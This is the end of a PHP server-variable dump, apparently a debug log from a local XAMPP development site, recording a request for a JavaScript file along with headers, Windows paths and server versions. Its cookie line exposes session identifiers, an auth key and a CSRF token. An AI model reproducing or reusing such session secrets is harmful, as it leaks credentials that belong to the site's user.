    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58837'
    'REDIRECT_URL' => '/js/escuela-selector.js'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/js/escuela-selector.js'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769631277.4858
    'REQUEST_TIME' => 1769631277
]
